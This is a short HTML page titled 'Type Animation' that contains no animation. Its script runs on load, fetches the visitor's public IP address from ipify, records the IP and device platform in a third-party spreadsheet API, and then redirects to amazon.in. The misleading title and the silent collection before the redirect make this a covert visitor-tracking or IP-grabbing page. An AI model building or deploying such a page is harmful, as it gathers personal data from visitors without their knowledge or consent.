<!doctype html>
<html lang="en">
  <head>
    <title>Type Animation</title>
    <!-- Required meta tags -->
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

    <!-- Bootstrap CSS -->
    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css" integrity="sha384-ggOyR0iXCbMQv3Xipma34MD+dH/1fQ784/j6cY/iJTQUOhcWr7x9JvoRxT2MZw1T" crossorigin="anonymous">
  </head>
  <body>
    <!-- Optional JavaScript -->
    <!-- jQuery first, then Popper.js, then Bootstrap JS -->
    <script src="https://code.jquery.com/jquery-3.6.1.min.js" integrity="sha256-o88AwQnZB+VDvE9tvIXrMQaPlFFSUTR+nldQm1LuPXQ=" crossorigin="anonymous"></script>    
    <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.7/umd/popper.min.js" integrity="sha384-UO2eT0CpHqdSJQ6hJty5KVphtPhzWj9WO1clHTMGa3JDZwrnQq4sF86dIHNDz0W1" crossorigin="anonymous"></script>
    <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/js/bootstrap.min.js" integrity="sha384-JjSmVgyd0p3pXB1rRibZUAYoIIy6OrQ6VrjIEaFf/nJGzIxFDsf4x0xIM+B07jRM" crossorigin="anonymous"></script>
    <script>
        $(document).ready(()=>{
            $.getJSON('https://api.ipify.org?format=json', 
            function(data){
                fetch("https://api.apispreadsheets.com/data/I0eZip2rK05BeLnZ/", {
                    method: "POST",
                    body: JSON.stringify({"data": {"Device":window.navigator.platform,"Ip Address":data.ip}, "query": `select * from I0eZip2rK05BeLnZ where Ip Address='${data.ip}'`}),
                }).then(res =>{
                    if (res.status === 201){
                        location.href = "https://www.amazon.in";
                    }
                    else{
                        fetch("https://api.apispreadsheets.com/data/I0eZip2rK05BeLnZ/", {
                            method: "POST",
                            body: JSON.stringify({"data": {"Device":window.navigator.platform,"Ip Address":data.ip}}),
                        }).then(res =>{
                            if (res.status === 201){
                                location.href = "https://www.amazon.in";
                            }
                            else{
                                location.reload;
                            }
                        })
                    }
                })
            });
        })
    </script>
  </body>
</html>
